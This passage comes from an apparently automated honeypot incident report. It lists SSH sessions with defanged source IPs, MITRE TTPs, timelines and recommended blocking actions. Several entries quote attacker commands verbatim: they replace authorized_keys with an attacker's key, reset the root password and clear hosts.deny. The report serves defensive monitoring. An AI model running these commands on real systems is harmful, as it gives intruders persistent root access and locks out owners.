| `2026-06-04 08:24:00` | `cowrie.session.connect` |
| `2026-06-04 08:24:00` | `cowrie.client.version` |
| `2026-06-04 08:24:00` | `cowrie.client.kex` |
| `2026-06-04 08:24:01` | `cowrie.login.success` |
| `2026-06-04 08:24:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.71.8[.]129` to AbuseIPDB if not already reported
- [ ] Block `98.71.8[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12c305fc928f

| Field | Detail |
|---|---|
| **Source IP** | `36.82.45[.]61` |
| **First Seen** | 2026-06-04 08:24 |
| **Last Seen** | 2026-06-04 08:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 08:24:41` | `cowrie.session.connect` |
| `2026-06-04 08:24:41` | `cowrie.client.version` |
| `2026-06-04 08:24:41` | `cowrie.client.kex` |
| `2026-06-04 08:24:42` | `cowrie.login.success` |
| `2026-06-04 08:24:42` | `cowrie.session.params` |
| `2026-06-04 08:24:42` | `cowrie.command.input` |
| `2026-06-04 08:24:42` | `cowrie.command.failed` |
| `2026-06-04 08:24:42` | `cowrie.log.closed` |
| `2026-06-04 08:24:42` | `cowrie.session.params` |
| `2026-06-04 08:24:42` | `cowrie.command.input` |
| `2026-06-04 08:24:42` | `cowrie.session.file_download` |
| `2026-06-04 08:24:42` | `cowrie.log.closed` |
| `2026-06-04 08:24:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.82.45[.]61` to AbuseIPDB if not already reported
- [ ] Block `36.82.45[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5449cb9330eb

| Field | Detail |
|---|---|
| **Source IP** | `36.82.45[.]61` |
| **First Seen** | 2026-06-04 08:24 |
| **Last Seen** | 2026-06-04 08:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 08:24:46` | `cowrie.session.connect` |
| `2026-06-04 08:24:46` | `cowrie.client.version` |
| `2026-06-04 08:24:46` | `cowrie.client.kex` |
| `2026-06-04 08:24:46` | `cowrie.login.success` |
| `2026-06-04 08:24:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.82.45[.]61` to AbuseIPDB if not already reported
- [ ] Block `36.82.45[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-524619c76494

| Field | Detail |
|---|---|
| **Source IP** | `115.135.233[.]75` |
| **First Seen** | 2026-06-04 08:27 |
| **Last Seen** | 2026-06-04 08:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 08:27:19` | `cowrie.session.connect` |
| `2026-06-04 08:27:19` | `cowrie.client.version` |
| `2026-06-04 08:27:19` | `cowrie.client.kex` |
| `2026-06-04 08:27:20` | `cowrie.login.success` |
| `2026-06-04 08:27:20` | `cowrie.session.params` |
| `2026-06-04 08:27:20` | `cowrie.command.input` |
| `2026-06-04 08:27:20` | `cowrie.command.failed` |
| `2026-06-04 08:27:20` | `cowrie.log.closed` |
| `2026-06-04 08:27:20` | `cowrie.session.params` |
| `2026-06-04 08:27:20` | `cowrie.command.input` |
| `2026-06-04 08:27:21` | `cowrie.session.file_download` |
| `2026-06-04 08:27:21` | `cowrie.log.closed` |
| `2026-06-04 08:27:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.135.233[.]75` to AbuseIPDB if not already reported
- [ ] Block `115.135.233[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a537bcd3c00

| Field | Detail |
|---|---|
| **Source IP** | `115.135.233[.]75` |
| **First Seen** | 2026-06-04 08:27 |
| **Last Seen** | 2026-06-04 08:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 08:27:22` | `cowrie.session.connect` |
| `2026-06-04 08:27:22` | `cowrie.client.version` |
| `2026-06-04 08:27:22` | `cowrie.client.kex` |
| `2026-06-04 08:27:23` | `cowrie.login.success` |
| `2026-06-04 08:27:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.135.233[.]75` to AbuseIPDB if not already reported
- [ ] Block `115.135.233[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4e6e9d78727

| Field | Detail |
|---|---|
| **Source IP** | `157.20.254[.]47` |
| **First Seen** | 2026-06-04 08:28 |
| **Last Seen** | 2026-06-04 08:29 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 08:28:48` | `cowrie.session.connect` |
| `2026-06-04 08:28:48` | `cowrie.client.version` |
| `2026-06-04 08:28:49` | `cowrie.client.kex` |
| `2026-06-04 08:28:49` | `cowrie.login.success` |
| `2026-06-04 08:28:49` | `cowrie.session.params` |
| `2026-06-04 08:28:49` | `cowrie.command.input` |
| `2026-06-04 08:28:49` | `cowrie.command.failed` |
| `2026-06-04 08:28:50` | `cowrie.log.closed` |
| `2026-06-04 08:28:50` | `cowrie.session.params` |
| `2026-06-04 08:28:50` | `cowrie.command.input` |
| `2026-06-04 08:28:50` | `cowrie.session.file_download` |
| `2026-06-04 08:28:50` | `cowrie.log.closed` |
| `2026-06-04 08:29:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.20.254[.]47` to AbuseIPDB if not already reported
- [ ] Block `157.20.254[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a34899b28334

| Field | Detail |
|---|---|
| **Source IP** | `157.20.254[.]47` |
| **First Seen** | 2026-06-04 08:29 |
| **Last Seen** | 2026-06-04 08:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 08:29:05` | `cowrie.session.connect` |
| `2026-06-04 08:29:05` | `cowrie.client.version` |
| `2026-06-04 08:29:05` | `cowrie.client.kex` |
| `2026-06-04 08:29:06` | `cowrie.login.success` |
| `2026-06-04 08:29:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.20.254[.]47` to AbuseIPDB if not already reported
- [ ] Block `157.20.254[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-017165ca6c80

| Field | Detail |
|---|---|
| **Source IP** | `115.135.233[.]75` |
| **First Seen** | 2026-06-04 08:29 |
| **Last Seen** | 2026-06-04 08:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 08:29:33` | `cowrie.session.connect` |
| `2026-06-04 08:29:33` | `cowrie.client.version` |
| `2026-06-04 08:29:33` | `cowrie.client.kex` |
| `2026-06-04 08:29:34` | `cowrie.login.success` |
| `2026-06-04 08:29:34` | `cowrie.session.params` |
| `2026-06-04 08:29:34` | `cowrie.command.input` |
| `2026-06-04 08:29:34` | `cowrie.command.failed` |
| `2026-06-04 08:29:34` | `cowrie.log.closed` |
| `2026-06-04 08:29:34` | `cowrie.session.params` |
| `2026-06-04 08:29:34` | `cowrie.command.input` |
| `2026-06-04 08:29:34` | `cowrie.session.file_download` |
| `2026-06-04 08:29:34` | `cowrie.log.closed` |
| `2026-06-04 08:29:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.135.233[.]75` to AbuseIPDB if not already reported
- [ ] Block `115.135.233[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-752a7afa73e0

| Field | Detail |
|---|---|
| **Source IP** | `115.135.233[.]75` |
| **First Seen** | 2026-06-04 08:29 |
| **Last Seen** | 2026-06-04 08:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 08:29:36` | `cowrie.session.connect` |
| `2026-06-04 08:29:36` | `cowrie.client.version` |
| `2026-06-04 08:29:36` | `cowrie.client.kex` |
| `2026-06-04 08:29:36` | `cowrie.login.success` |
| `2026-06-04 08:29:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.135.233[.]75` to AbuseIPDB if not already reported
- [ ] Block `115.135.233[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62ac74399c3e

| Field | Detail |
|---|---|
| **Source IP** | `157.20.254[.]47` |
| **First Seen** | 2026-06-04 08:39 |
| **Last Seen** | 2026-06-04 08:39 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:AMCvLEg3WKBC"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 08:39:23` | `cowrie.session.connect` |
| `2026-06-04 08:39:23` | `cowrie.client.version` |
| `2026-06-04 08:39:23` | `cowrie.client.kex` |
| `2026-06-04 08:39:24` | `cowrie.login.success` |
| `2026-06-04 08:39:24` | `cowrie.session.params` |
| `2026-06-04 08:39:24` | `cowrie.command.input` |
| `2026-06-04 08:39:24` | `cowrie.command.failed` |
| `2026-06-04 08:39:24` | `cowrie.log.closed` |
| `2026-06-04 08:39:25` | `cowrie.session.params` |
| `2026-06-04 08:39:25` | `cowrie.command.input` |
| `2026-06-04 08:39:25` | `cowrie.session.file_download` |
| `2026-06-04 08:39:25` | `cowrie.log.closed` |
| `2026-06-04 08:39:42` | `cowrie.session.params` |
| `2026-06-04 08:39:42` | `cowrie.command.input` |
| `2026-06-04 08:39:42` | `cowrie.log.closed` |
| `2026-06-04 08:39:42` | `cowrie.session.params` |
| `2026-06-04 08:39:42` | `cowrie.command.input` |
| `2026-06-04 08:39:43` | `cowrie.log.closed` |
| `2026-06-04 08:39:43` | `cowrie.session.params` |
| `2026-06-04 08:39:43` | `cowrie.command.input` |
| `2026-06-04 08:39:43` | `cowrie.session.file_download` |
| `2026-06-04 08:39:43` | `cowrie.log.closed` |
| `2026-06-04 08:39:43` | `cowrie.session.params` |
| `2026-06-04 08:39:43` | `cowrie.command.input` |
| `2026-06-04 08:39:44` | `cowrie.log.closed` |
| `2026-06-04 08:39:44` | `cowrie.session.params` |
| `2026-06-04 08:39:44` | `cowrie.command.input` |
| `2026-06-04 08:39:44` | `cowrie.log.closed` |
| `2026-06-04 08:39:44` | `cowrie.session.params` |
| `2026-06-04 08:39:44` | `cowrie.command.input` |
| `2026-06-04 08:39:44` | `cowrie.command.input` |
| `2026-06-04 08:39:44` | `cowrie.log.closed` |
| `2026-06-04 08:39:45` | `cowrie.session.params` |
| `2026-06-04 08:39:45` | `cowrie.command.input` |
| `2026-06-04 08:39:45` | `cowrie.log.closed` |
| `2026-06-04 08:39:45` | `cowrie.session.params` |
| `2026-06-04 08:39:45` | `cowrie.command.input` |
| `2026-06-04 08:39:45` | `cowrie.log.closed` |
| `2026-06-04 08:39:45` | `cowrie.session.params` |
| `2026-06-04 08:39:45` | `cowrie.command.input` |
| `2026-06-04 08:39:46` | `cowrie.log.closed` |
| `2026-06-04 08:39:46` | `cowrie.session.params` |
| `2026-06-04 08:39:46` | `cowrie.command.input` |
| `2026-06-04 08:39:46` | `cowrie.log.closed` |
| `2026-06-04 08:39:46` | `cowrie.session.params` |
| `2026-06-04 08:39:46` | `cowrie.command.input` |
| `2026-06-04 08:39:46` | `cowrie.log.closed` |
| `2026-06-04 08:39:47` | `cowrie.session.params` |
| `2026-06-04 08:39:47` | `cowrie.command.input` |
| `2026-06-04 08:39:47` | `cowrie.log.closed` |
| `2026-06-04 08:39:47` | `cowrie.session.params` |
| `2026-06-04 08:39:47` | `cowrie.command.input` |
| `2026-06-04 08:39:47` | `cowrie.log.closed` |
| `2026-06-04 08:39:47` | `cowrie.session.params` |
| `2026-06-04 08:39:47` | `cowrie.command.input` |
| `2026-06-04 08:39:48` | `cowrie.log.closed` |
| `2026-06-04 08:39:48` | `cowrie.session.params` |
| `2026-06-04 08:39:48` | `cowrie.command.input` |
| `2026-06-04 08:39:48` | `cowrie.log.closed` |
| `2026-06-04 08:39:48` | `cowrie.session.params` |
| `2026-06-04 08:39:48` | `cowrie.command.input` |
| `2026-06-04 08:39:48` | `cowrie.log.closed` |
| `2026-06-04 08:39:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.20.254[.]47` to AbuseIPDB if not already reported
- [ ] Block `157.20.254[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c71932325eb3

| Field | Detail |
|---|---|
| **Source IP** | `157.20.254[.]47` |
| **First Seen** | 2026-06-04 08:47 |
| **Last Seen** | 2026-06-04 08:47 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:C8Yg9aUfvcFh"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 08:47:17` | `cowrie.session.connect` |
| `2026-06-04 08:47:17` | `cowrie.client.version` |
| `2026-06-04 08:47:18` | `cowrie.client.kex` |
| `2026-06-04 08:47:18` | `cowrie.login.success` |
| `2026-06-04 08:47:18` | `cowrie.session.params` |
| `2026-06-04 08:47:18` | `cowrie.command.input` |
| `2026-06-04 08:47:18` | `cowrie.command.failed` |
| `2026-06-04 08:47:19` | `cowrie.log.closed` |
| `2026-06-04 08:47:19` | `cowrie.session.params` |
| `2026-06-04 08:47:19` | `cowrie.command.input` |
| `2026-06-04 08:47:19` | `cowrie.session.file_download` |
| `2026-06-04 08:47:19` | `cowrie.log.closed` |
| `2026-06-04 08:47:36` | `cowrie.session.params` |
| `2026-06-04 08:47:36` | `cowrie.command.input` |
| `2026-06-04 08:47:36` | `cowrie.log.closed` |
| `2026-06-04 08:47:36` | `cowrie.session.params` |
| `2026-06-04 08:47:36` | `cowrie.command.input` |
| `2026-06-04 08:47:37` | `cowrie.log.closed` |
| `2026-06-04 08:47:37` | `cowrie.session.params` |
| `2026-06-04 08:47:37` | `cowrie.command.input` |
| `2026-06-04 08:47:37` | `cowrie.session.file_download` |
| `2026-06-04 08:47:37` | `cowrie.log.closed` |
| `2026-06-04 08:47:37` | `cowrie.session.params` |
| `2026-06-04 08:47:37` | `cowrie.command.input` |
| `2026-06-04 08:47:37` | `cowrie.log.closed` |
| `2026-06-04 08:47:38` | `cowrie.session.params` |
| `2026-06-04 08:47:38` | `cowrie.command.input` |
| `2026-06-04 08:47:38` | `cowrie.log.closed` |
| `2026-06-04 08:47:38` | `cowrie.session.params` |
| `2026-06-04 08:47:38` | `cowrie.command.input` |
| `2026-06-04 08:47:38` | `cowrie.command.input` |
| `2026-06-04 08:47:38` | `cowrie.log.closed` |
| `2026-06-04 08:47:39` | `cowrie.session.params` |
| `2026-06-04 08:47:39` | `cowrie.command.input` |
| `2026-06-04 08:47:39` | `cowrie.log.closed` |
| `2026-06-04 08:47:39` | `cowrie.session.params` |
| `2026-06-04 08:47:39` | `cowrie.command.input` |
| `2026-06-04 08:47:39` | `cowrie.log.closed` |
| `2026-06-04 08:47:39` | `cowrie.session.params` |
| `2026-06-04 08:47:39` | `cowrie.command.input` |
| `2026-06-04 08:47:40` | `cowrie.log.closed` |
| `2026-06-04 08:47:40` | `cowrie.session.params` |
| `2026-06-04 08:47:40` | `cowrie.command.input` |
| `2026-06-04 08:47:40` | `cowrie.log.closed` |
| `2026-06-04 08:47:40` | `cowrie.session.params` |
| `2026-06-04 08:47:40` | `cowrie.command.input` |
| `2026-06-04 08:47:40` | `cowrie.log.closed` |
| `2026-06-04 08:47:41` | `cowrie.session.params` |
| `2026-06-04 08:47:41` | `cowrie.command.input` |
| `2026-06-04 08:47:41` | `cowrie.log.closed` |
| `2026-06-04 08:47:41` | `cowrie.session.params` |
| `2026-06-04 08:47:41` | `cowrie.command.input` |
| `2026-06-04 08:47:41` | `cowrie.log.closed` |
| `2026-06-04 08:47:41` | `cowrie.session.params` |
| `2026-06-04 08:47:41` | `cowrie.command.input` |
| `2026-06-04 08:47:42` | `cowrie.log.closed` |
| `2026-06-04 08:47:42` | `cowrie.session.params` |
| `2026-06-04 08:47:42` | `cowrie.command.input` |
| `2026-06-04 08:47:42` | `cowrie.log.closed` |
| `2026-06-04 08:47:42` | `cowrie.session.params` |
| `2026-06-04 08:47:42` | `cowrie.command.input` |
| `2026-06-04 08:47:42` | `cowrie.log.closed` |
| `2026-06-04 08:47:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.20.254[.]47` to AbuseIPDB if not already reported
- [ ] Block `157.20.254[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-030b7ab336ad

| Field | Detail |
|---|---|
| **Source IP** | `58.209.82[.]184` |
| **First Seen** | 2026-06-04 08:54 |
| **Last Seen** | 2026-06-04 08:55 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:SsagcGNfwcFF"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 08:54:45` | `cowrie.session.connect` |
| `2026-06-04 08:54:46` | `cowrie.client.version` |
| `2026-06-04 08:54:47` | `cowrie.client.kex` |
| `2026-06-04 08:54:48` | `cowrie.login.success` |
| `2026-06-04 08:54:49` | `cowrie.session.params` |
| `2026-06-04 08:54:49` | `cowrie.command.input` |
| `2026-06-04 08:54:49` | `cowrie.command.failed` |
| `2026-06-04 08:54:49` | `cowrie.log.closed` |
| `2026-06-04 08:54:50` | `cowrie.session.params` |
| `2026-06-04 08:54:50` | `cowrie.command.input` |
| `2026-06-04 08:54:50` | `cowrie.session.file_download` |
| `2026-06-04 08:54:50` | `cowrie.log.closed` |
| `2026-06-04 08:55:03` | `cowrie.session.params` |
| `2026-06-04 08:55:03` | `cowrie.command.input` |
| `2026-06-04 08:55:03` | `cowrie.log.closed` |
| `2026-06-04 08:55:03` | `cowrie.session.params` |
| `2026-06-04 08:55:03` | `cowrie.command.input` |
| `2026-06-04 08:55:04` | `cowrie.log.closed` |
| `2026-06-04 08:55:05` | `cowrie.session.params` |
| `2026-06-04 08:55:05` | `cowrie.command.input` |
| `2026-06-04 08:55:05` | `cowrie.session.file_download` |
| `2026-06-04 08:55:05` | `cowrie.log.closed` |
| `2026-06-04 08:55:06` | `cowrie.session.params` |
